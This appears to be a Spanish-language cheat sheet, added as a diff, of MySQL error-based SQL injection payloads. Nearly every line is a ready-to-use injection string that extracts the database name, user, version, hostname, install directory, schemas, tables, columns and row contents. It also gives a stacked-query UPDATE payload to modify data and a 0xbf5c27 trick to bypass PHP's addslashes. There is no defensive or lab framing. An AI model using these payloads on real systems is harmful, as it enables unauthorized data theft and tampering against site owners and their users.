@@ -1,0 +1,77 @@
+Para probar por inyeccion
+
+' and 'x'='x
+
+Para seleccionar base de datos actual
+
+' and(select 1 from(select count(*),concat((select (select concat(0x7e,0x27,cast(database() as char),0x27,0x7e)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and '1'='1
+
+Para encontrar el usuario actual
+
+' and(select 1 from(select count(*),concat((select (select concat(0x7e,0x27,cast(user() as char)),0x27,0x7e) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and '1'='1
+
+Para encontrar la version del mysql
+
+' and(select 1 from(select count(*),concat((select (select concat(0x7e,0x27,cast(version() as char),0x27,0x7e)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and '1'='1
+
+Base de datos seleccionada
+
+' and(select 1 from(select count(*),concat((select (select concat(0x7e,0x27,cast(database() as char),0x27,0x7e)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and '1'='1
+
+Usuario del sistema
+
+' and(select 1 from(select count(*),concat((select (select concat(0x7e,0x27,cast(system_user() as char),0x27,0x7e)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and '1'='1
+
+Nombre de host
+
+' and(select 1 from(select count(*),concat((select (select concat(0x7e,0x27,cast(@@hostname as char),0x27,0x7e)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and '1'='1
+
+Directorio de instalacion
+
+' and(select 1 from(select count(*),concat((select (select concat(0x7e,0x27,cast(@@basedir as char),0x27,0x7e)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and '1'='1
+
+usuario de la base de datos
+
+' and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,0x27,cast(GRANTEE as char),0x27,0x7e) FROM information_schema.user_privileges LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and '1'='1
+
+Para encontrar las bases de datos
+
+donde este el testo n+1 es un valor que se incrementa, es el offset
+
+' and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,0x27,cast(schema_name as char),0x27,0x7e) FROM information_schema.schemata LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and '1'='1
+
+Para encontrar el numero de tablas de una base de datos
+
+Donde dice hexadecimal_base-datos es necesario colocar el nombre de la base de datos en hexadecimal
+
+' and(select 1 from(select count(*),concat((select (select (SELECT concat(0x7e,0x27,count(table_name),0x27,0x7e) FROM `information_schema`.tables WHERE table_schema=0xhexadecimal_base-datos)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and '1'='1
+
+Para obtener el nombde de las tablas de una base de datos
+
+' and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,0x27,Hex(cast(table_name as char)),0x27,0x7e) FROM information_schema.tables Where table_schema=0xhexadecimal_base-datos limit n+1,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and '1'='1
+
+Para obtener del numero de columnas de una tabla
+
+' and(select 1 from(select count(*),concat((select (select (SELECT concat(0x7e,0x27,count(column_name),0x27,0x7e) FROM `information_schema`.columns WHERE table_schema=0xnombre_base_datos_hexadecimal AND table_name=0xnombre_tabla_hexadecimal)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and '1'='1
+
+Para obtener el nombre de las columnas de una base de datos
+
+' and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,0x27,Hex(cast(column_name as char)),0x27,0x7e) FROM information_schema.columns Where table_schema=0xhexadecimal_base_datos AND table_name=0xhexadecimal_tabla limit n+1,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and '1'='1
+
+Para contar el número de registros de una columna
+
+' and(select 1 from(select count(*),concat((select (select (SELECT concat(0x7e,0x27,count(*),0x27,0x7e) FROM `nombre_base_datos`.nombre_tabla)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and '1'='1
+
+Para obtener los datos de un registro determinado
+
+' and(select 1 from(select count(*),concat((select (select (SELECT concat(0x7e,0x27,cast(nombre_tabla.nombre_columna as char),0x27,0x7e) FROM `nombre_base_datos`.nombre_tabla LIMIT n+1,1) ) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and '1'='1
+
+A veces es posible actualizar los datos con ... USAR CON CUIDADO
+
+1';UPDATE nombre_tabla SET nombre_columna=0xhexadecimal_nuevo_nombre_columna WHERE nombre_columna=0xhexadecimal_valor_antiguo--
+
+muchas veces es necesario usar 0xbf5c27 en vez de la comilla simple para saltar la proteccion de la funcion addslashes de PHP
+
+
+
+
